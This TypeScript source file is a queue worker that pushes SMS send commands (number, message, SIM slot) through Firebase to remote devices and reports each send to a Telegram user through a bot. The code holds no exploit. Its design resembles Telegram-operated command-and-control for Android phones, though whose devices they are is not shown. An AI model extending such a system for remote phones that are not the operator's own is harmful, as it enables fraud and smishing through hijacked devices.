import { bot } from "../bot/bot";

import { BackendRepository } from "../database/repositories/BackendRepository";
import { SmsQueueRepository } from "../database/repositories/SmsQueueRepository";

import { FirebaseRestClient } from "../backends/firebase/FirebaseRestClient";

import { MONITOR } from "../constants/monitor";

import { logger } from "../logger/logger";





function escapeHtml(text:string){

    return String(text)
        .replace(/&/g,"&amp;")
        .replace(/</g,"&lt;")
        .replace(/>/g,"&gt;")
        .replace(/"/g,"&quot;")
        .replace(/'/g,"&#039;");

}





export function startSenderWorker() {


    setInterval(async () => {


        try {


            const queue:any =
                SmsQueueRepository.findNextQueued();



            if(!queue){

                return;

            }




            SmsQueueRepository.markProcessing(
                queue.id
            );





            const startTime =
                Date.now();




            logger.info(
                `Processing SMS ${queue.command_id}`
            );






            const backend:any =
                BackendRepository.findConfig(
                    queue.backend_id
                );





            if(!backend){


                SmsQueueRepository.markFailed(

                    queue.id,

                    "Backend not found."

                );


                logger.error(
                    `Backend ${queue.backend_id} not found`
                );


                return;

            }







            if(
                backend.status !== "online"
            ){


                SmsQueueRepository.markFailed(

                    queue.id,

                    "Backend offline."

                );


                logger.warn(
                    `Backend ${queue.backend_id} offline`
                );


                return;


            }









            switch(
                backend.backend_type
            ){



                case "firebase_json":
                {



                    const config =
                        backend.config;






                    if(
                        !config.database_url
                    ){


                        SmsQueueRepository.markFailed(

                            queue.id,

                            "Missing database_url."

                        );


                        return;


                    }








                    const payload = {


                        command_id:
                            queue.command_id,



                        device_id:
                            queue.device_id,



                        number:
                            queue.phone_number,



                        message:
                            queue.message,



                        sim_slot:
                            queue.sim_slot,



                        status:
                            "pending",



                        result_message:
                            "Queued by Nagato",



                        updated_at:
                            Date.now(),



                        executed_at:
                            ""

                    };







                    await FirebaseRestClient.createSmsCommand(


                        config.database_url,


                        queue.device_id,


                        queue.command_id,


                        payload


                    );








                    SmsQueueRepository.markUploaded(


                        queue.id,


                        `/users/${queue.device_id}/sms_send/${queue.command_id}`


                    );







                    const totalTime =
                        Date.now() - startTime;





                    /*
                       SEND DELIVERY CONFIRMATION
                       TO USER PRIVATE CHAT
                    */


                    try{


                        await bot.telegram.sendMessage(


                            queue.telegram_id,



`<pre>
✅ SMS FORWARDED
📱 DEVICE: ${escapeHtml(queue.device_id)}
📶 SIM: SIM ${queue.sim_slot}
📞 NUMBER: ${escapeHtml(queue.phone_number)}
🔐 MESSAGE: ${escapeHtml(queue.message)}
🆔 COMMAND: ${queue.command_id}
⚡ STATUS: Uploaded to device queue ⏱ TIME: ${totalTime}ms
</pre>`,

                            {

                                parse_mode:
                                "HTML"

                            }


                        );



                    }
                    catch(error:any){


                        logger.error(

                            `Telegram delivery notification failed: ${error.message}`

                        );


                    }









                    logger.info(

                        `SMS uploaded to Firebase -> ${queue.command_id}`

                    );



                    break;


                }







                case "firebase_url":
                {


                    SmsQueueRepository.markFailed(

                        queue.id,

                        "Firebase URL backend not implemented."

                    );



                    logger.warn(

                        "firebase_url backend not implemented."

                    );


                    break;


                }







                case "vps":
                {


                    SmsQueueRepository.markFailed(

                        queue.id,

                        "VPS backend not implemented."

                    );



                    logger.warn(

                        "VPS backend not implemented."

                    );


                    break;


                }







                default:
                {


                    SmsQueueRepository.markFailed(

                        queue.id,

                        `Unknown backend type: ${backend.backend_type}`

                    );



                    logger.error(

                        `Unknown backend type ${backend.backend_type}`

                    );



                    break;


                }



            }






        }
        catch(error:any){


            logger.error(

                `SenderWorker: ${error?.message ?? error}`

            );


        }



    }, MONITOR.SENDER_WORKER_INTERVAL_MS);



}